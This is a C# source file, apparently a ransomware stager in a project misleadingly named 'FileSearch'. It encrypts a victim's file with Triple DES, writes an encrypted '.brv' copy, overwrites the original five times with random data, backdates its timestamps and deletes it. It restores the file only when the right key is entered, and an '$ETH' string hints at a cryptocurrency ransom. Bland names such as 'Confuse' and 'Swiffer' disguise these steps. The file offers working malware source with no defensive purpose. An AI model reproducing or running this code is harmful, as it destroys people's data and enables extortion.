using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FileSearch
{
    public class Stager
    {
        private string subKey {get;}
        private string filePath { get; set; }
        private bool isConfused;

        public Stager(string key, string path, bool confused)
        {
            subKey = key;
            filePath = path;
            isConfused = confused;
        }

        public void Deploy()
        {
            // Zing zong user's file
            if(!isConfused)
            {
                string storage = Utils.Base64Encode("ml5" + subKey + "$ETH");
                Change(filePath, storage);
            }
            // Run UI
            Application.Run(new Graphic(this));
        }

        public void Change(string pathToFile, string keyboard)
        {
            // 1:1
            byte[] rawBytes = File.ReadAllBytes(pathToFile);
            if (Path.GetExtension(pathToFile) != ".brv")
            {
                byte[] editedBytes = Confuse(rawBytes, keyboard);
                bool temp = Utils.ByteArrayToFile(pathToFile + ".brv", editedBytes);
                filePath = pathToFile + ".brv";
                WipeFile(pathToFile, 5);
            }
            // 0:0
            else
            {
                if (keyboard == Utils.Base64Encode("ml5" + subKey + "$ETH"))
                {
                    byte[] editedBytes = Unconfuse(rawBytes, keyboard);
                    bool temp = Utils.ByteArrayToFile(pathToFile.TrimEnd('.', 'b', 'r', 'v') + 'r', editedBytes);
                    filePath = pathToFile.TrimEnd('.', 'b', 'r', 'v') + 'r';
                    WipeFile(pathToFile, 5);
                    Utils.endMySelf();
                }
                else
                {
                    MessageBox.Show("Your key is wrong my brother, you should try another!");
                }

            }
        }

        #region Swiffer
        public void WipeFile(string filename, int timesToWrite)
        {
            try
            {
                if (File.Exists(filename))
                {
                    File.SetAttributes(filename, FileAttributes.Normal);
                    double sectors = Math.Ceiling(new FileInfo(filename).Length / 512.0);
                    byte[] dummyBuffer = new byte[512];
                    RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
                    FileStream inputStream = new FileStream(filename, FileMode.Open);
                    for (int currentPass = 0; currentPass < timesToWrite; currentPass++)
                    {
                        inputStream.Position = 0;
                        for (int sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
                        {
                            rng.GetBytes(dummyBuffer);
                            inputStream.Write(dummyBuffer, 0, dummyBuffer.Length);
                        }
                    }
                    inputStream.SetLength(0);
                    inputStream.Close();
                    DateTime dt = new DateTime(2037, 1, 1, 0, 0, 0);
                    File.SetCreationTime(filename, dt);
                    File.SetLastAccessTime(filename, dt);
                    File.SetLastWriteTime(filename, dt);
                    File.Delete(filename);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("ooh shit : " + e.ToString());
            }
        }
#endregion

        #region Confuser & Unconfuser
        private static byte[] Confuse(byte[] bytData, string sKey, CipherMode tMode = CipherMode.ECB, PaddingMode tPadding = PaddingMode.PKCS7)
        {
            MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
            byte[] key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(sKey));
            md5CryptoServiceProvider.Clear();
            TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider
            {
                Key = key,
                Mode = tMode,
                Padding = tPadding
            };
            byte[] result = tripleDESCryptoServiceProvider.CreateEncryptor().TransformFinalBlock(bytData, 0, bytData.Length);
            tripleDESCryptoServiceProvider.Clear();
            return result;
        }


        private static byte[] Unconfuse(byte[] bytData, string sKey, CipherMode tMode = CipherMode.ECB, PaddingMode tPadding = PaddingMode.PKCS7)
        {
            byte[] keyArray;
            MD5CryptoServiceProvider hashmd5 = new MD5CryptoServiceProvider();
            keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(sKey));
            hashmd5.Clear();
            TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider();
            tdes.Key = keyArray;
            tdes.Mode = tMode;
            tdes.Padding = tPadding;
            ICryptoTransform cTransform = tdes.CreateDecryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(bytData, 0, bytData.Length);
            tdes.Clear();
            return resultArray;
        }
        #endregion

        #region Gets
        public string getKey()
        {
            return subKey;
        }

        public string getFilePath()
        {
            return filePath;
        }
        #endregion

    }
}
